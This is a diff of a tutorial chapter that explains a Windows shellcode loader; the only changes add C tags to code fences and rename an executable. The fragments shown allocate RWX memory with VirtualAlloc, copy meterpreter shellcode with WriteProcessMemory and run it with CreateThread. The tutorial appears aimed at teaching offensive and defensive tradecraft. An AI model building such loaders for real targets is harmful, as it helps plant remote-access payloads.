@@ -57,7 +57,7 @@ Within the main function, the variable **code** is defined, which is responsible
 The next code block defines the function pointer **void***, which points to the variable **exec** and stores the return address of the allocated memory using the Windows API VirtualAlloc.
 <details>
     
-```
+```C
 // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
     // 'exec' will hold the base address of the allocated memory region
     void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -68,7 +68,7 @@ The next code block defines the function pointer **void***, which points to the 
 The meterpreter shellcode is then copied to the allocated memory using the Windows API **WriteProcessMemory**.
 <details>
 
-```
+```C
 // Copy the shellcode into the allocated memory region using WriteProcessMemory
     SIZE_T bytesWritten;
     WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
@@ -79,7 +79,7 @@ The meterpreter shellcode is then copied to the allocated memory using the Windo
 Next, the Windows API **CreateThread** is used to execute the meterpreter shellcode. This is done by creating a new thread.<p align="center">
 <details>
     
-```
+```C
 // Create a new thread to execute the shellcode
     // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
     // The returned handle of the created thread is stored in hThread
@@ -91,7 +91,7 @@ Next, the Windows API **CreateThread** is used to execute the meterpreter shellc
 And by using the Windows API **WaitForSingleObject** we need to make sure that the shellcode thread completes its execution before the main thread exits.
 <details>  
     
-```
+```C
 // Wait for the shellcode execution thread to finish executing
     // This ensures the main thread doesn't exit before the shellcode has finished running
     WaitForSingleObject(hThread, INFINITE);    
@@ -102,7 +102,7 @@ And by using the Windows API **WaitForSingleObject** we need to make sure that t
 Here is the **complete code**, but you can also find it already implemented in the code poc of this chapter.
 <details>
     
-```
+```C
 #include <stdio.h>
 #include <windows.h>
 
@@ -205,7 +205,7 @@ The Visual Studio tool dumpbin can be used to check which Windows APIs are impor
 **cmd>**  
 ```
 cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
-dumpbin /imports high_level.exe
+dumpbin /imports Win32-API.exe
 ```
 </details>
     
